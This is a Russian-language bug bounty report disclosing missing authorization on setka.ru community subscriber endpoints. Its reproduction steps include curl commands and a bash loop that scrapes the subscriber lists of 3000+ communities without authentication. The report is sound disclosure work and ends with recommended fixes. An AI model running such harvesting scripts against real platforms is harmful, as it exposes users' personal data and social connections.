# Report 06: Mass Data Harvesting — подписчики сообществ

---
**Поля формы:**

- **Название:** Mass Data Harvesting — полный список подписчиков всех сообществ без аутентификации
- **Уровень опасности:** Средний
- **CWE:** CWE-862 (Missing Authorization)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

`GET https://setka.ru/communities/{id}/subscribers` (без аутентификации)

## Описание уязвимости

Endpoint `GET /communities/{id}/subscribers` возвращает **полный список подписчиков** любого сообщества **без аутентификации** (155KB на сообщество).

Это не просто раскрытие «публичной информации». Комбинация с `/communities/sitemap-1.xml` (3000+ ID, также без auth) создаёт **вектор массового сбора данных**:
- **465MB+ персональных данных** одним скриптом
- **Социальный граф** всей платформы — кто в каких сообществах
- Нарушение **152-ФЗ**: bulk-выгрузка связей без согласия субъектов ПДн

Отсутствие аутентификации превращает приватную функцию в публичный API для data mining.

## Шаги воспроизведения

### 1. Получение ID сообществ (без auth)

```bash
curl -b "X_Bug_Bounty=security_standoff" \
  "https://setka.ru/communities/sitemap-1.xml" -o communities.xml
```
→ `200 OK`, 735KB, 3000+ community IDs

### 2. Получение подписчиков (без auth)

```bash
curl -b "X_Bug_Bounty=security_standoff" \
  "https://setka.ru/communities/{community_id}/subscribers"
```
→ `200 OK`, 155KB — полный HTML со списком подписчиков. **Аутентификация не требуется.**

### 3. Масштабирование

```bash
for id in $(grep -oP 'communities/\K[^<]+' communities.xml); do
  curl -s -b "X_Bug_Bounty=security_standoff" \
    "https://setka.ru/communities/$id/subscribers" -o "subs_$id.html"
done
```
→ Потенциальный объём: 3000 × 155KB = ~465MB данных

## Влияние на безопасность

1. **Mass Data Collection:** Полная социальная карта платформы.
2. **Social Engineering:** Таргетированный фишинг на основе membership данных.
3. **152-ФЗ:** Bulk-выгрузка связей без согласия — нарушение закона о ПДн.
4. **Competitive Intelligence:** Конкуренты получают структуру аудитории HH.

**Рекомендации:** Добавить аутентификацию, авторизацию (только участники), пагинацию (20-50 записей), rate limiting.

## Дополнительные ссылки

- CWE-862: https://cwe.mitre.org/data/definitions/862.html
- 152-ФЗ: http://www.consultant.ru/document/cons_doc_LAW_61801/
